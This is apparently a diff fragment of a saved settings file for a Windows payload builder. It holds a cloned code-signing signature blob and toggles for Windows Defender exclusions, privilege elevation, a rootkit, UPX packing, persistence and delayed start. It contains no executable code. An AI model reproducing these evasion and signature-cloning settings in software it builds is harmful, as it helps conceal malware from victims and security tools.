cDAwExghM7MIITNwYJKoZIhvcNAQcCoIITKDCCEyQCAQMxDzANBglghkgBZQMEAgIFADCB8AYLKoZIhvcNAQkQAQSggeAEgd0wgdoCAQEGCisGAQQBsjECAQEwMTANBglghkgBZQMEAgEFAAQgXwKJQdOd33fnCzQwSik1wxlV1SFR5DJn84Kmc52/Mo4CFQDOYVc3A4xlHKstQgJTmrdMbNK2ThgPMjAyMzEyMDExMDEyMDhaoG6kbDBqMQswCQYDVQQGEwJHQjETMBEGA1UECBMKTWFuY2hlc3RlcjEYMBYGA1UEChMPU2VjdGlnbyBMaW1pdGVkMSwwKgYDVQQDDCNTZWN0aWdvIFJTQSBUaW1lIFN0YW1waW5nIFNpZ25lciAjNKCCDekwggb1MIIE3aADAgECAhA5TCXhfKBtJ6hl4jvZHSLUMA0GCSqGSIb3DQEBDAUAMH0xCzAJBgNVBAYTAkdCMRswGQYDVQQIExJHcmVhdGVyIE1hbmNoZXN0ZXIxEDAOBgNVBAcTB1NhbGZvcmQxGDAWBgNVBAoTD1NlY3RpZ28gTGltaXRlZDElMCMGA1UEAxMcU2VjdGlnbyBSU0EgVGltZSBTdGFtcGluZyBDQTAeFw0yMzA1MDMwMDAwMDBaFw0zNDA4MDIyMzU5NTlaMGoxCzAJBgNVBAYTAkdCMRMwEQYDVQQIEwpNYW5jaGVzdGVyMRgwFgYDVQQKEw9TZWN0aWdvIExpbWl0ZWQxLDAqBgNVBAMMI1NlY3RpZ28gUlNBIFRpbWUgU3RhbXBpbmcgU2lnbmVyICM0MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEApJMoUkvPJ4d2pCkcmTjA5w7U0RzsaMsBZOSKzXewcWWCvJ/8i7u7lZj7JRGOWogJZhEUWLK6Ilvm9jLxXS3AeqIO4OBWZO2h5YEgciBkQWzHwwj6831d7yGawn7XLMO6EZge/NMgCEKzX79/iFgyqzCz2Ix6lkoZE1ys/Oer6RwWLrCwOJVKz4VQq2cDJaG7OOkPb6lampEoEzW5H/M94STIa7GZ6A3vu03lPYxUA5HQ/C3PVTM4egkcB9Ei4GOGp7790oNzEhSbmkwJRr00vOFLUHty4Fv9GbsfPGoZe267LUQqvjxMzKyKBJPGV4agczYrgZf6G5t+iIfYUnmJ/m53N9e7UJ/6GCVPE/JefKmxIFopq6NCh3fg9EwCSN1YpVOmo6DtGZZlFSnF7TMwJeaWg4Ga9mBmkFgHgM1Cdaz7tJHQxd0BQGq2qBDu9o16t551r9OlSxihDJ9XsF4lR5F0zXUS0Zxv5F4Nm+x1Ju7+0/WSL1KF6NpEUSqizADKh2ZDoxsA76K1lp1irScL8htKycOUQjeIIISoh67DuiNye/hU7/hrJ7CF9adDhdgrOXTbWncC0aT69c2cPcwfrlHQe2zYHS0RQlNxdMLlNaotUhLZJc/w09CRQxLXMn2YbON3Qcj/HyRU726txj5Ve/Fchzpk8WBLBU/vuS/sCRMCAwEAAaOCAYIwggF+MB8GA1UdIwQYMBaAFBqh+GEZIA/DQXdFKI7RNV8GEgRVMB0GA1UdDgQWBBQDDzHIkSqTvWPz0V1NpDQP0pUBGDAOBgNVHQ8BAf8EBAMCBsAwDAYDVR0TAQH/BAIwADAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDBKBgNVHSAEQzBBMDUGDCsGAQQBsjEBAgEDCDAlMCMGCCsGAQUFBwIBFhdodHRwczovL3NlY3RpZ28uY29tL0NQUzAIBgZngQwBBAIwRAYDVR0fBD0wOzA5oDegNYYzaHR0cDovL2NybC5zZWN0aWdvLmNvbS9TZWN0aWdvUlNBVGltZVN0YW1waW5nQ0EuY3JsMHQGCCsGAQUFBwEBBGgwZjA/BggrBgEFBQcwAoYzaHR0cDovL2NydC5zZWN0aWdvLmNvbS9TZWN0aWdvUlNBVGltZVN0YW1waW5nQ0EuY3J0MCMGCCsGAQUFBzABhhdodHRwOi8vb2NzcC5zZWN0aWdvLmNvbTANBgkqhkiG9w0BAQwFAAOCAgEATJtlWPrgec/vFcMybd4zket3WOLrvctKPHXefpRtwyLHBJXfZWlhEwz2DJ71iSBewYfHAyTKx6XwJt/4+DFlDeDrbVFXpoyEUghGHCrC3vLaikXzvvf2LsR+7fjtaL96VkjpYeWaOXe8vrqRZIh1/12FFjQn0inL/+0t2v++kwzsbaINzMPxbr0hkRojAFKtl9RieCqEeajXPawhj3DDJHk6l/ENo6NbU9irALpY+zWAT18ocWwZXsKDcpCu4MbY8pn76rSSZXwHfDVEHa1YGGti+95sxAqpbNMhRnDcL411TCPCQdB6ljvDS93NkiZ0dlw3oJoknk5fTtOPD+UTT1lEZUtDZM9I+GdnuU2/zA2xOjDQoT1IrXpl5Ozf4AHwsypKOazBpPmpfTXQMkCgsRkqGCGyyH0FcRpLJzaq4Jgcg3Xnx35LhEPNQ/uQl3YqEqxAwXBbmQpA+oBtlGF7yG65yGdnJFxQjQEg3gf3AdT4LhHNnYPl+MolHEQ9J+WwhkcqCxuEdn17aE+Nt/cTtO2gLe5zD9kQup2ZLHzXdR+PEMSU5n4k5ZVKiIwn1oVmHfmuZHaR6Ej+yFUK7SnDH944psAU+zI9+KmDYjbIw74Ahxyr+kpCHIkD3PVcfHDZXXhO7p9eIOYJanwrCKNI9RX8BE/fzSEceuX1jhrUuUAwggbsMIIE1KADAgECAhAwD2+s3WaYdHypRjaneC25MA0GCSqGSIb3DQEBDAUAMIGIMQswCQYDVQQGEwJVUzETMBEGA1UECBMKTmV3IEplcnNleTEUMBIGA1UEBxMLSmVyc2V5IENpdHkxHjAcBgNVBAoTFVRoZSBVU0VSVFJVU1QgTmV0d29yazEuMCwGA1UEAxMlVVNFUlRydXN0IFJTQSBDZXJ0aWZpY2F0aW9uIEF1dGhvcml0eTAeFw0xOTA1MDIwMDAwMDBaFw0zODAxMTgyMzU5NTlaMH0xCzAJBgNVBAYTAkdCMRswGQYDVQQIExJHcmVhdGVyIE1hbmNoZXN0ZXIxEDAOBgNVBAcTB1NhbGZvcmQxGDAWBgNVBAoTD1NlY3RpZ28gTGltaXRlZDElMCMGA1UEAxMcU2VjdGlnbyBSU0EgVGltZSBTdGFtcGluZyBDQTCCAiIwDQYJKoZIhvcNAQEBBQADggIPADCCAgoCggIBAMgbAa/ZLH6ImX0BmD8gkL2cgCFUk7nPoD5T77NawHbWGgSlzkeDtevEzEk0y/NFZbn5p2QWJgn71TJSeS7JY8ITm7aGPwEFkmZvIavVcRB5h/RGKs3EWsnb111JTXJWD9zJ41OYOioe/M5YSdO/8zm7uaQjQqzQFcN/nqJc1zjxFrJw06PE37PFcqwuCnf8DZRSt/wflXMkPQEovA8NT7ORAY5unSd1VdEXOzQhe5cBlK9/gM/REQpXhMl/VuC9RpyCvpSdv7QgsGB+uE31DT/b0OqFjIpWcdEtlEzIjDzTFKKcvSb/01Mgx2Bpm1gKVPQF5/0xrPnIhRfHuCkZpCkvRuPd25Ffnz82Pg4wZytGtzWvlr7aTGDMqLufDRTUGMQwmHSCIc9iVrUhcxIe/arKCFiHd6QV6xlV/9A5VC0m7kUaOm/N14Tw1/AoxU9kgwLU++Le8bwCKPRt2ieKBtKWh97oaw7wW33pdmmTIBxKlyx3GSuTlZicl57rjsF4VsZEJd8GEpoGLZ8DXv2DolNnyrH6jaFkyYiSWcuoRsDJ8qb/fVfbEnb6ikEk1Bv8cqUUotStQxykSYtBORQDHin6G6UirqXDTYLQjdprt9v3GEBXc/Bxo/tKfUU2wfeNgvq5yQ1TgH36tjlYMu9vGFCJ10+dM70atZ2h3pVBeqeDAgMBAAGjggFaMIIBVjAfBgNVHSMEGDAWgBRTeb9aqitKz1SA4dibwJ3ysgNmyzAdBgNVHQ4EFgQUGqH4YRkgD8NBd0UojtE1XwYSBFUwDgYDVR0PAQH/BAQDAgGGMBIGA1UdEwEB/wQIMAYBAf8CAQAwEwYDVR0lBAwwCgYIKwYBBQUHAwgwEQYDVR0gBAowCDAGBgRVHSAAMFAGA1UdHwRJMEcwRaBDoEGGP2h0dHA6Ly9jcmwudXNlcnRydXN0LmNvbS9VU0VSVHJ1c3RSU0FDZXJ0aWZpY2F0aW9uQXV0aG9yaXR5LmNybDB2BggrBgEFBQcBAQRqMGgwPwYIKwYBBQUHMAKGM2h0dHA6Ly9jcnQudXNlcnRydXN0LmNvbS9VU0VSVHJ1c3RSU0FBZGRUcnVzdENBLmNydDAlBggrBgEFBQcwAYYZaHR0cDovL29jc3AudXNlcnRydXN0LmNvbTANBgkqhkiG9w0BAQwFAAOCAgEAbVSBpTNdFuG1U4GRdd8DejILLSWEEbKw2yp9KgX1vDsn9FqguUlZkClsYcu1UNviffmfAO9Aw63T4uRW+VhBz/FC5RB9/7B0H4/GXAn5M17qoBwmWFzztBEP1dXD4rzVWHi/SHbhRGdtj7BDEA+N5Pk4Yr8TAcWFo0zFzLJTMJWk1vSWVgi4zVx/AZa+clJqO0I3fBZ4OZOTlJux3LJtQW1nzclvkD1/RXLBGyPWwlWEZuSzxWYG9vPWS16toytCiiGS/qhvWiVwYoFzY16gu9jc10rTPa+DBjgSHSSHLeT8AtY+dwS8BDa153fLnC6NIxi5o8JHHfBd1qFzVwVomqfJN2Udvuq82EKDQwWli6YJ/9GhlKZOqj0J9QVst9JkWtgqIsJLnfE5XkzeSD2bNJaaCV+O/fexUpHOP4n2HKG1qXUfcb9bQ11lPVCBbqvw0NP8srMftpmWJvQ8eYtcZMzN7iea5aDADHKHwW5NWtMe6vBE5jJvHOsXTpTDeGUgOw9Bqh/poUGd/rG4oGUqNODeqPk85sEwu8CgYyz8XBYAqNDEf+oRnR4GxqZtMl20OAkrSQeq/eww2vGnL8+3/frQo4TZJ577AWZ3uVYQ4SBuxq6x+ba6yDVdM3aO8XwgDCp3rrWiAoa6Ke60WgCxjKvj+QrJVF3UuWp0nr1IrpgxggQsMIIEKAIBATCBkTB9MQswCQYDVQQGEwJHQjEbMBkGA1UECBMSR3JlYXRlciBNYW5jaGVzdGVyMRAwDgYDVQQHEwdTYWxmb3JkMRgwFgYDVQQKEw9TZWN0aWdvIExpbWl0ZWQxJTAjBgNVBAMTHFNlY3RpZ28gUlNBIFRpbWUgU3RhbXBpbmcgQ0ECEDlMJeF8oG0nqGXiO9kdItQwDQYJYIZIAWUDBAICBQCgggFrMBoGCSqGSIb3DQEJAzENBgsqhkiG9w0BCRABBDAcBgkqhkiG9w0BCQUxDxcNMjMxMjAxMTAxMjA4WjA/BgkqhkiG9w0BCQQxMgQwy9ctvFuqTGICi54eOhJKKf5pSWJJe0giPLDWLy0NRV7c58uUWVoEcahgCVniROvJMIHtBgsqhkiG9w0BCRACDDGB3TCB2jCB1zAWBBSuYq91Cgy9R9ZGH3Vo4ryM58pPlDCBvAQUAtZbleKDcMFXAJX6iPkj3ZN/rY8wgaMwgY6kgYswgYgxCzAJBgNVBAYTAlVTMRMwEQYDVQQIEwpOZXcgSmVyc2V5MRQwEgYDVQQHEwtKZXJzZXkgQ2l0eTEeMBwGA1UEChMVVGhlIFVTRVJUUlVTVCBOZXR3b3JrMS4wLAYDVQQDEyVVU0VSVHJ1c3QgUlNBIENlcnRpZmljYXRpb24gQXV0aG9yaXR5AhAwD2+s3WaYdHypRjaneC25MA0GCSqGSIb3DQEBAQUABIICAHhY4TaogSrUHsI+EDgNtcUbtUTrWbebuXb0fpJBf/I/AEcJBdNybjZW4JklmG2ZlQeMKtfavDyVuMNRW10ia9ggueScvYEFSCBEAv90koNAzzms8VsBOWi2VfhPm/0M2VXUqmxcVIwq0ZPxs5EC3kJtcMwjRtio83XoKxerAjSMpQQlG43bDcOZ5npnOoHyRblAHnQROTLOBTPKTRHkaUTQWabpTcI5OoQmUDzPos6/nHA5iK2k1eMRjsMqYB/uYq6BpLvphWcvCU2c06bpY9UL74J9grIQur5FZzxhge6HfGUkwdUk13DE9qKx9EXuzoLZDsVwC+VLZmmwPGBFHJuCZWGfH8dJPyWEOLeytLGm7/X6btT+YeU2X/RyyZ0Gd510eJdP3RpZG1iir45dPZoMGL8ZitEi/FSF6y8SOVdUlNmExR5yyAVSmNrurCxeLC1o5MZYnLGE4yVgQLvsA3nvIDINuP0V9zGKk8pjzEwnqA9pvhvCNVGFolu+JoakaTAoe/UEFTSxGT107zT0QiCHBSj430CGA2hLEv2apVWhJb69OZR9NxY4x02l+8KK3q4WO23hhcz8imdGVmet5l1/CXgi9P7ev47Q4oqcRPUzonAWnCJjgi45yzD97w5//u7SO5yX2QNtgoHOrm2Uc7WBegJkbIn3Lvmese6b80qjAAAAAAAAAA==</Text>
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="MephButton" Name="btnSignatureClone">
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="MephButton" Name="btnSignatureBrowse">
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="MephTextBox" Name="txtSignaturePath">
+          <Text />
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="MephCheckBox" Name="chkSignature">
+          <Text>Enabled</Text>
+          <Checked>True</Checked>
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+      </Control>
+      <Control Type="System.Windows.Forms.TabPage" Name="tabOptions">
+        <Visible>False</Visible>
+        <Enabled>True</Enabled>
+        <Control Type="System.Windows.Forms.PictureBox" Name="picAdmin5">
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="MephToggleSwitch" Name="toggleProcessProtect">
+          <Text />
+          <Checked>False</Checked>
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="MephButton" Name="btnAdvancedOptions">
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="System.Windows.Forms.PictureBox" Name="picAdmin2">
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="MephToggleSwitch" Name="toggleWindowsUpdate">
+          <Text />
+          <Checked>True</Checked>
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="System.Windows.Forms.PictureBox" Name="picAdmin3">
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="MephCheckBox" Name="chkBlockWebsites">
+          <Text>Блокировка сайтов</Text>
+          <Checked>False</Checked>
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="MephTextBox" Name="txtBlockWebsites">
+          <Text />
+          <Visible>True</Visible>
+          <Enabled>False</Enabled>
+        </Control>
+        <Control Type="MephToggleSwitch" Name="toggleDisableSleep">
+          <Text />
+          <Checked>True</Checked>
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="MephToggleSwitch" Name="toggleAdministrator">
+          <Text />
+          <Checked>True</Checked>
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="System.Windows.Forms.PictureBox" Name="picAdmin1">
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="MephToggleSwitch" Name="toggleWDExclusions">
+          <Text />
+          <Checked>True</Checked>
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+      </Control>
+      <Control Type="System.Windows.Forms.TabPage" Name="tabBuild">
+        <Visible>False</Visible>
+        <Enabled>True</Enabled>
+        <Control Type="MephTextBox" Name="txtStartDelay">
+          <Text>12</Text>
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="MephTextBox" Name="txtLog">
+          <Text>Output...</Text>
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+        <Control Type="MephButton" Name="btnBuild">
+          <Visible>True</Visible>
+          <Enabled>True</Enabled>
+        </Control>
+      </Control>
+    </Control>
+  </Control>
+  <Control Type="MephTheme" Name="formAdvancedOptions">
+    <Visible>True</Visible>
+    <Enabled>True</Enabled>
+    <Control Type="MephToggleSwitch" Name="toggleUPXPack">
+      <Text />
+      <Checked>True</Checked>
+      <Visible>True</Visible>
+      <Enabled>True</Enabled>
+    </Control>
+    <Control Type="System.Windows.Forms.PictureBox" Name="pictureBox1">
+      <Visible>True</Visible>
+      <Enabled>True</Enabled>
+    </Control>
+    <Control Type="MephToggleSwitch" Name="toggleRootkit">
+      <Text />
+      <Checked>False</Checked>
+      <Visible>True</Visible>
+      <Enabled>True</Enabled>
+    </Control>
+    <Control Type="MephToggleSwitch" Name="toggleRunInstall">
+      <Text />
+      <Checked>True</Checked>
+      <Visible>True</Visible>
+      <Enabled>True</Enabled>
+    </Control>
+  </Control>
+</Form>
